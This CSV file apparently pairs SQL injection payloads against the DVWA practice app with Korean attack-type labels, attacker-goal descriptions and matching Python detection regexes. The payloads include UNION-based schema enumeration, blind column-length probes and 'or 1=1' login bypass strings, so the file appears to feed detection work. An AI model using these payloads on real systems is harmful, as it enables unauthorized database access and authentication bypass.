"33' union select 1,column_name from information_schema.columns where table_name='users' limit 3,1 #",UNION 기반 정보 검색,column_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?column_name"", re.IGNORECASE)"
"84' union select 1,column_name from information_schema.columns where table_name='users' limit 3,1 #",UNION 기반 정보 검색,column_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?column_name"", re.IGNORECASE)"
"84' union select 1,table_name from information_schema.tables where table_schema='dvwa' #",UNION 기반 정보 검색,table_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?table_name\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?from\\sinformation_schema\\.tables\\s(where\\stable_schema\\s*?\\=\\s*?\\'(.*)\\')*?"", re.IGNORECASE)"
28' or '1'='1' limit 1 #,논리적 조건 조작,논리적 조건을 항상 참으로 만들어 인증 우회,"re.compile(""(\\d)*?'\\s*?or\\s(1=1|true|\\'\\d*\\'=\\'\\d*\\')"", re.IGNORECASE)"
"' union select 1, 2 #",UNION 기반 정보 검색,Column 수를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d+\\s*?\\,\\s*?)*\\d+\\s*?(#)"", re.IGNORECASE)"
1' and (select 1 from information_schema.columns where table_schema='dvwa' and table_name='users' and length(column_name)=6) #,UNION 기반 정보 검색,컬럼의 길이를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?and\\s\\(select\\s\\d\\sfrom\\sinformation_schema\\.columns\\swhere\\stable_schema\\=\\'(.*)\\'(\\sand\\stable_name\\=\\'(.*)\\')*?(\\sand\\slength\\(column_name\\)\\=\\d)*?"", re.IGNORECASE)"
1' and (select 1 from information_schema.columns where table_schema='dvwa' and table_name='guestbook' and length(column_name)=4) #,UNION 기반 정보 검색,컬럼의 길이를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?and\\s\\(select\\s\\d\\sfrom\\sinformation_schema\\.columns\\swhere\\stable_schema\\=\\'(.*)\\'(\\sand\\stable_name\\=\\'(.*)\\')*?(\\sand\\slength\\(column_name\\)\\=\\d)*?"", re.IGNORECASE)"
65' or '1'='1' limit 1 #,논리적 조건 조작,논리적 조건을 항상 참으로 만들어 인증 우회,"re.compile(""(\\d)*?'\\s*?or\\s(1=1|true|\\'\\d*\\'=\\'\\d*\\')"", re.IGNORECASE)"
"94' union select 1,column_name from information_schema.columns where table_name='guestbook' limit 2,1 #",UNION 기반 정보 검색,column_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?column_name"", re.IGNORECASE)"
"33' union select 1,column_name from information_schema.columns where table_name='users' #",UNION 기반 정보 검색,column_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?column_name"", re.IGNORECASE)"
"33' union select 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 #",UNION 기반 정보 검색,Column 수를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d+\\s*?\\,\\s*?)*\\d+\\s*?(#)"", re.IGNORECASE)"
"64' union select 1, 2, 3 #",UNION 기반 정보 검색,Column 수를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d+\\s*?\\,\\s*?)*\\d+\\s*?(#)"", re.IGNORECASE)"
"40' union select 1,column_name from information_schema.columns where table_name='users' and table_schema='dvwa' #",UNION 기반 정보 검색,column_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?column_name"", re.IGNORECASE)"
"' union select 1,column_name from information_schema.columns where table_name='users' #",UNION 기반 정보 검색,column_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?column_name"", re.IGNORECASE)"
"' union select 1,column_name from information_schema.columns where table_name='users' #",UNION 기반 정보 검색,column_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?column_name"", re.IGNORECASE)"
"96' union select 1, 2 #",UNION 기반 정보 검색,Column 수를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d+\\s*?\\,\\s*?)*\\d+\\s*?(#)"", re.IGNORECASE)"
"87' union select database(), 2 #",UNION 기반 정보 검색,현재 사용 중인 데이터베이스의 이름을 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?database\\(\\)"", re.IGNORECASE)"
"' union select 1,column_name from information_schema.columns where table_name='users' and table_schema='dvwa' #",UNION 기반 정보 검색,column_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?column_name"", re.IGNORECASE)"
"3' union select 1, 2, 3, 4 #",UNION 기반 정보 검색,Column 수를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d+\\s*?\\,\\s*?)*\\d+\\s*?(#)"", re.IGNORECASE)"
20' or 1=1 limit 5 #,논리적 조건 조작,논리적 조건을 항상 참으로 만들어 인증 우회,"re.compile(""(\\d)*?'\\s*?or\\s(1=1|true|\\'\\d*\\'=\\'\\d*\\')"", re.IGNORECASE)"
"72' union select 1,column_name from information_schema.columns where table_name='guestbook' #",UNION 기반 정보 검색,column_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?column_name"", re.IGNORECASE)"
"84' union select 1, 2, 3, 4, 5 #",UNION 기반 정보 검색,Column 수를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d+\\s*?\\,\\s*?)*\\d+\\s*?(#)"", re.IGNORECASE)"
"77' union select 1,column_name from information_schema.columns where table_name='users' and table_schema='dvwa' limit 2,1 #",UNION 기반 정보 검색,column_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?column_name"", re.IGNORECASE)"
"' union select 1,table_name from information_schema.tables where table_schema='dvwa' #",UNION 기반 정보 검색,table_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?table_name\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?from\\sinformation_schema\\.tables\\s(where\\stable_schema\\s*?\\=\\s*?\\'(.*)\\')*?"", re.IGNORECASE)"
"87' union select database(), 2 #",UNION 기반 정보 검색,현재 사용 중인 데이터베이스의 이름을 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?database\\(\\)"", re.IGNORECASE)"
"60' union select 1, 2, 3, 4 #",UNION 기반 정보 검색,Column 수를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d+\\s*?\\,\\s*?)*\\d+\\s*?(#)"", re.IGNORECASE)"
"' union select 1, 2, 3, 4, 5, 6, 7, 8 #",UNION 기반 정보 검색,Column 수를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d+\\s*?\\,\\s*?)*\\d+\\s*?(#)"", re.IGNORECASE)"
"' union select 1,table_name from information_schema.tables where table_schema='dvwa' #",UNION 기반 정보 검색,table_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?table_name\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?from\\sinformation_schema\\.tables\\s(where\\stable_schema\\s*?\\=\\s*?\\'(.*)\\')*?"", re.IGNORECASE)"
"66' union select 1, 2, 3, 4, 5, 6 #",UNION 기반 정보 검색,Column 수를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d+\\s*?\\,\\s*?)*\\d+\\s*?(#)"", re.IGNORECASE)"
"' union select 1, 2, 3, 4, 5, 6 #",UNION 기반 정보 검색,Column 수를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d+\\s*?\\,\\s*?)*\\d+\\s*?(#)"", re.IGNORECASE)"
"10' union select 1, 2, 3, 4, 5, 6, 7 #",UNION 기반 정보 검색,Column 수를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d+\\s*?\\,\\s*?)*\\d+\\s*?(#)"", re.IGNORECASE)"
"95' union select 1, 2, 3, 4 #",UNION 기반 정보 검색,Column 수를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d+\\s*?\\,\\s*?)*\\d+\\s*?(#)"", re.IGNORECASE)"
"66' union select 1, 2, 3, 4 #",UNION 기반 정보 검색,Column 수를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d+\\s*?\\,\\s*?)*\\d+\\s*?(#)"", re.IGNORECASE)"
"63' union select 1,table_name from information_schema.tables where table_schema='dvwa' #",UNION 기반 정보 검색,table_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?table_name\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?from\\sinformation_schema\\.tables\\s(where\\stable_schema\\s*?\\=\\s*?\\'(.*)\\')*?"", re.IGNORECASE)"
"37' union select 1,column_name from information_schema.columns where table_name='users' and table_schema='dvwa' limit 2,1 #",UNION 기반 정보 검색,column_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?column_name"", re.IGNORECASE)"
59' or true #,논리적 조건 조작,논리적 조건을 항상 참으로 만들어 인증 우회,"re.compile(""(\\d)*?'\\s*?or\\s(1=1|true|\\'\\d*\\'=\\'\\d*\\')"", re.IGNORECASE)"
"23' union select database(), 2 #",UNION 기반 정보 검색,현재 사용 중인 데이터베이스의 이름을 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?database\\(\\)"", re.IGNORECASE)"
"13' union select 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 #",UNION 기반 정보 검색,Column 수를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d+\\s*?\\,\\s*?)*\\d+\\s*?(#)"", re.IGNORECASE)"
67' or '1'='1' limit 1 #,논리적 조건 조작,논리적 조건을 항상 참으로 만들어 인증 우회,"re.compile(""(\\d)*?'\\s*?or\\s(1=1|true|\\'\\d*\\'=\\'\\d*\\')"", re.IGNORECASE)"
"61' union select 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 #",UNION 기반 정보 검색,Column 수를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d+\\s*?\\,\\s*?)*\\d+\\s*?(#)"", re.IGNORECASE)"
35' union select 1 #,UNION 기반 정보 검색,Column 수를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d+\\s*?\\,\\s*?)*\\d+\\s*?(#)"", re.IGNORECASE)"
60' or true limit 1 #,논리적 조건 조작,논리적 조건을 항상 참으로 만들어 인증 우회,"re.compile(""(\\d)*?'\\s*?or\\s(1=1|true|\\'\\d*\\'=\\'\\d*\\')"", re.IGNORECASE)"
"45' union select 1, 2, 3, 4 #",UNION 기반 정보 검색,Column 수를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d+\\s*?\\,\\s*?)*\\d+\\s*?(#)"", re.IGNORECASE)"
1' and (select 1 from information_schema.columns where table_schema='dvwa' and table_name='users' and length(column_name)=1) #,UNION 기반 정보 검색,컬럼의 길이를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?and\\s\\(select\\s\\d\\sfrom\\sinformation_schema\\.columns\\swhere\\stable_schema\\=\\'(.*)\\'(\\sand\\stable_name\\=\\'(.*)\\')*?(\\sand\\slength\\(column_name\\)\\=\\d)*?"", re.IGNORECASE)"
"17' union select 1, 2, 3, 4, 5, 6 #",UNION 기반 정보 검색,Column 수를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d+\\s*?\\,\\s*?)*\\d+\\s*?(#)"", re.IGNORECASE)"
1' and (select 1 from information_schema.columns where table_schema='dvwa' and table_name='users' and length(column_name)=3) #,UNION 기반 정보 검색,컬럼의 길이를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?and\\s\\(select\\s\\d\\sfrom\\sinformation_schema\\.columns\\swhere\\stable_schema\\=\\'(.*)\\'(\\sand\\stable_name\\=\\'(.*)\\')*?(\\sand\\slength\\(column_name\\)\\=\\d)*?"", re.IGNORECASE)"
"33' union select 1,column_name from information_schema.columns where table_name='users' limit 3,1 #",UNION 기반 정보 검색,column_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?column_name"", re.IGNORECASE)"
1' and (select 1 from information_schema.columns where table_schema='dvwa' and table_name='guestbook' and length(column_name)=9) #,UNION 기반 정보 검색,컬럼의 길이를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?and\\s\\(select\\s\\d\\sfrom\\sinformation_schema\\.columns\\swhere\\stable_schema\\=\\'(.*)\\'(\\sand\\stable_name\\=\\'(.*)\\')*?(\\sand\\slength\\(column_name\\)\\=\\d)*?"", re.IGNORECASE)"
"37' union select 1, table_name from information_schema.tables #",UNION 기반 정보 검색,table_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?table_name\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?from\\sinformation_schema\\.tables\\s(where\\stable_schema\\s*?\\=\\s*?\\'(.*)\\')*?"", re.IGNORECASE)"
"94' union select 1,column_name from information_schema.columns where table_name='guestbook' limit 2,1 #",UNION 기반 정보 검색,column_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?column_name"", re.IGNORECASE)"
1' and (select 1 from information_schema.columns where table_schema='dvwa' and table_name='guestbook' and length(column_name)=5) #,UNION 기반 정보 검색,컬럼의 길이를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?and\\s\\(select\\s\\d\\sfrom\\sinformation_schema\\.columns\\swhere\\stable_schema\\=\\'(.*)\\'(\\sand\\stable_name\\=\\'(.*)\\')*?(\\sand\\slength\\(column_name\\)\\=\\d)*?"", re.IGNORECASE)"
"' union select 1, 2, 3, 4, 5 #",UNION 기반 정보 검색,Column 수를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d+\\s*?\\,\\s*?)*\\d+\\s*?(#)"", re.IGNORECASE)"
"20' union select 1, 2, 3 #",UNION 기반 정보 검색,Column 수를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d+\\s*?\\,\\s*?)*\\d+\\s*?(#)"", re.IGNORECASE)"
"20' union select 1,column_name from information_schema.columns where table_name='users' #",UNION 기반 정보 검색,column_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?column_name"", re.IGNORECASE)"
' union select 1 #,UNION 기반 정보 검색,Column 수를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d+\\s*?\\,\\s*?)*\\d+\\s*?(#)"", re.IGNORECASE)"
"37' union select 1,column_name from information_schema.columns where table_name='users' and table_schema='dvwa' limit 2,1 #",UNION 기반 정보 검색,column_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?column_name"", re.IGNORECASE)"
' or true #,논리적 조건 조작,논리적 조건을 항상 참으로 만들어 인증 우회,"re.compile(""(\\d)*?'\\s*?or\\s(1=1|true|\\'\\d*\\'=\\'\\d*\\')"", re.IGNORECASE)"
"23' union select database(), 2 #",UNION 기반 정보 검색,현재 사용 중인 데이터베이스의 이름을 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?database\\(\\)"", re.IGNORECASE)"
' or 1=1 limit 5 #,논리적 조건 조작,논리적 조건을 항상 참으로 만들어 인증 우회,"re.compile(""(\\d)*?'\\s*?or\\s(1=1|true|\\'\\d*\\'=\\'\\d*\\')"", re.IGNORECASE)"
1' and (select 1 from information_schema.columns where table_schema='dvwa' and table_name='guestbook' and length(column_name)=6) #,UNION 기반 정보 검색,컬럼의 길이를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?and\\s\\(select\\s\\d\\sfrom\\sinformation_schema\\.columns\\swhere\\stable_schema\\=\\'(.*)\\'(\\sand\\stable_name\\=\\'(.*)\\')*?(\\sand\\slength\\(column_name\\)\\=\\d)*?"", re.IGNORECASE)"
"16' union select 1,column_name from information_schema.columns where table_name='users' and table_schema='dvwa' limit 2,1 #",UNION 기반 정보 검색,column_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?column_name"", re.IGNORECASE)"
"' union select 1, 2, 3, 4, 5, 6, 7, 8, 9 #",UNION 기반 정보 검색,Column 수를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d+\\s*?\\,\\s*?)*\\d+\\s*?(#)"", re.IGNORECASE)"
68' or '1'='1' limit 1 #,논리적 조건 조작,논리적 조건을 항상 참으로 만들어 인증 우회,"re.compile(""(\\d)*?'\\s*?or\\s(1=1|true|\\'\\d*\\'=\\'\\d*\\')"", re.IGNORECASE)"
"' union select 1,column_name from information_schema.columns where table_name='users' and table_schema='dvwa' #",UNION 기반 정보 검색,column_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?column_name"", re.IGNORECASE)"
"42' union select 1,column_name from information_schema.columns where table_name='users' limit 3,1 #",UNION 기반 정보 검색,column_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?column_name"", re.IGNORECASE)"
"39' union select 1,table_name from information_schema.tables where table_schema='dvwa' #",UNION 기반 정보 검색,table_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?table_name\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?from\\sinformation_schema\\.tables\\s(where\\stable_schema\\s*?\\=\\s*?\\'(.*)\\')*?"", re.IGNORECASE)"
"' union select 1,column_name from information_schema.columns where table_name='users' and table_schema='dvwa' #",UNION 기반 정보 검색,column_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?column_name"", re.IGNORECASE)"
1' and (select 1 from information_schema.columns where table_schema='dvwa' and table_name='guestbook' and length(column_name)=1) #,UNION 기반 정보 검색,컬럼의 길이를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?and\\s\\(select\\s\\d\\sfrom\\sinformation_schema\\.columns\\swhere\\stable_schema\\=\\'(.*)\\'(\\sand\\stable_name\\=\\'(.*)\\')*?(\\sand\\slength\\(column_name\\)\\=\\d)*?"", re.IGNORECASE)"
"79' union select 1,column_name from information_schema.columns where table_name='users' limit 3,1 #",UNION 기반 정보 검색,column_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?column_name"", re.IGNORECASE)"
"' union select 1, 2, 3, 4, 5, 6 #",UNION 기반 정보 검색,Column 수를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d+\\s*?\\,\\s*?)*\\d+\\s*?(#)"", re.IGNORECASE)"
"' union select 1,table_name from information_schema.tables where table_schema='dvwa' #",UNION 기반 정보 검색,table_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?table_name\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?from\\sinformation_schema\\.tables\\s(where\\stable_schema\\s*?\\=\\s*?\\'(.*)\\')*?"", re.IGNORECASE)"
"32' union select 1, 2, 3, 4 #",UNION 기반 정보 검색,Column 수를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d+\\s*?\\,\\s*?)*\\d+\\s*?(#)"", re.IGNORECASE)"
1' and (select 1 from information_schema.columns where table_schema='dvwa' and table_name='guestbook' and length(column_name)=7) #,UNION 기반 정보 검색,컬럼의 길이를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?and\\s\\(select\\s\\d\\sfrom\\sinformation_schema\\.columns\\swhere\\stable_schema\\=\\'(.*)\\'(\\sand\\stable_name\\=\\'(.*)\\')*?(\\sand\\slength\\(column_name\\)\\=\\d)*?"", re.IGNORECASE)"
"40' union select 1,column_name from information_schema.columns where table_name='users' and table_schema='dvwa' #",UNION 기반 정보 검색,column_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?column_name"", re.IGNORECASE)"
20' or 1=1 limit 5 #,논리적 조건 조작,논리적 조건을 항상 참으로 만들어 인증 우회,"re.compile(""(\\d)*?'\\s*?or\\s(1=1|true|\\'\\d*\\'=\\'\\d*\\')"", re.IGNORECASE)"
65' or '1'='1' limit 1 #,논리적 조건 조작,논리적 조건을 항상 참으로 만들어 인증 우회,"re.compile(""(\\d)*?'\\s*?or\\s(1=1|true|\\'\\d*\\'=\\'\\d*\\')"", re.IGNORECASE)"
"28' union select 1,column_name from information_schema.columns where table_name='users' and table_schema='dvwa' #",UNION 기반 정보 검색,column_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?column_name"", re.IGNORECASE)"
10' or true #,논리적 조건 조작,논리적 조건을 항상 참으로 만들어 인증 우회,"re.compile(""(\\d)*?'\\s*?or\\s(1=1|true|\\'\\d*\\'=\\'\\d*\\')"", re.IGNORECASE)"
"28' union select 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 #",UNION 기반 정보 검색,Column 수를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d+\\s*?\\,\\s*?)*\\d+\\s*?(#)"", re.IGNORECASE)"
"' union select 1,column_name from information_schema.columns where table_name='users' limit 3,1 #",UNION 기반 정보 검색,column_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?column_name"", re.IGNORECASE)"
' or true limit 1 #,논리적 조건 조작,논리적 조건을 항상 참으로 만들어 인증 우회,"re.compile(""(\\d)*?'\\s*?or\\s(1=1|true|\\'\\d*\\'=\\'\\d*\\')"", re.IGNORECASE)"
1' and (select 1 from information_schema.columns where table_schema='dvwa' and table_name='users' and length(column_name)=3) #,UNION 기반 정보 검색,컬럼의 길이를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?and\\s\\(select\\s\\d\\sfrom\\sinformation_schema\\.columns\\swhere\\stable_schema\\=\\'(.*)\\'(\\sand\\stable_name\\=\\'(.*)\\')*?(\\sand\\slength\\(column_name\\)\\=\\d)*?"", re.IGNORECASE)"
64' or 1=1 limit 5 #,논리적 조건 조작,논리적 조건을 항상 참으로 만들어 인증 우회,"re.compile(""(\\d)*?'\\s*?or\\s(1=1|true|\\'\\d*\\'=\\'\\d*\\')"", re.IGNORECASE)"
"44' union select 1, 2, 3, 4, 5, 6, 7, 8 #",UNION 기반 정보 검색,Column 수를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d+\\s*?\\,\\s*?)*\\d+\\s*?(#)"", re.IGNORECASE)"
"' union select 1,column_name from information_schema.columns where table_name='guestbook' limit 2,1 #",UNION 기반 정보 검색,column_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?column_name"", re.IGNORECASE)"
1' and (select 1 from information_schema.columns where table_schema='dvwa' and table_name='users' and length(column_name)=1) #,UNION 기반 정보 검색,컬럼의 길이를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?and\\s\\(select\\s\\d\\sfrom\\sinformation_schema\\.columns\\swhere\\stable_schema\\=\\'(.*)\\'(\\sand\\stable_name\\=\\'(.*)\\')*?(\\sand\\slength\\(column_name\\)\\=\\d)*?"", re.IGNORECASE)"
"9' union select 1,column_name from information_schema.columns where table_name='guestbook' and table_schema='dvwa' #",UNION 기반 정보 검색,column_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?column_name"", re.IGNORECASE)"
65' or true #,논리적 조건 조작,논리적 조건을 항상 참으로 만들어 인증 우회,"re.compile(""(\\d)*?'\\s*?or\\s(1=1|true|\\'\\d*\\'=\\'\\d*\\')"", re.IGNORECASE)"
"66' union select 1, 2, 3, 4, 5, 6 #",UNION 기반 정보 검색,Column 수를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d+\\s*?\\,\\s*?)*\\d+\\s*?(#)"", re.IGNORECASE)"
6' or '1'='1' #,논리적 조건 조작,논리적 조건을 항상 참으로 만들어 인증 우회,"re.compile(""(\\d)*?'\\s*?or\\s(1=1|true|\\'\\d*\\'=\\'\\d*\\')"", re.IGNORECASE)"
"' union select 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 #",UNION 기반 정보 검색,Column 수를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d+\\s*?\\,\\s*?)*\\d+\\s*?(#)"", re.IGNORECASE)"
69' or true #,논리적 조건 조작,논리적 조건을 항상 참으로 만들어 인증 우회,"re.compile(""(\\d)*?'\\s*?or\\s(1=1|true|\\'\\d*\\'=\\'\\d*\\')"", re.IGNORECASE)"
' or true limit 1 #,논리적 조건 조작,논리적 조건을 항상 참으로 만들어 인증 우회,"re.compile(""(\\d)*?'\\s*?or\\s(1=1|true|\\'\\d*\\'=\\'\\d*\\')"", re.IGNORECASE)"
"' union select 1,column_name from information_schema.columns where table_name='users' and table_schema='dvwa' limit 1,1 #",UNION 기반 정보 검색,column_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?column_name"", re.IGNORECASE)"
"39' union select 1,table_name from information_schema.tables where table_schema='dvwa' #",UNION 기반 정보 검색,table_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?table_name\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?from\\sinformation_schema\\.tables\\s(where\\stable_schema\\s*?\\=\\s*?\\'(.*)\\')*?"", re.IGNORECASE)"
' or 1=1 #,논리적 조건 조작,논리적 조건을 항상 참으로 만들어 인증 우회,"re.compile(""(\\d)*?'\\s*?or\\s(1=1|true|\\'\\d*\\'=\\'\\d*\\')"", re.IGNORECASE)"
9' union select 1 #,UNION 기반 정보 검색,Column 수를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d+\\s*?\\,\\s*?)*\\d+\\s*?(#)"", re.IGNORECASE)"
1' and (select 1 from information_schema.columns where table_schema='dvwa' and table_name='users' and length(column_name)=5) #,UNION 기반 정보 검색,컬럼의 길이를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?and\\s\\(select\\s\\d\\sfrom\\sinformation_schema\\.columns\\swhere\\stable_schema\\=\\'(.*)\\'(\\sand\\stable_name\\=\\'(.*)\\')*?(\\sand\\slength\\(column_name\\)\\=\\d)*?"", re.IGNORECASE)"
97' or 1=1 #,논리적 조건 조작,논리적 조건을 항상 참으로 만들어 인증 우회,"re.compile(""(\\d)*?'\\s*?or\\s(1=1|true|\\'\\d*\\'=\\'\\d*\\')"", re.IGNORECASE)"
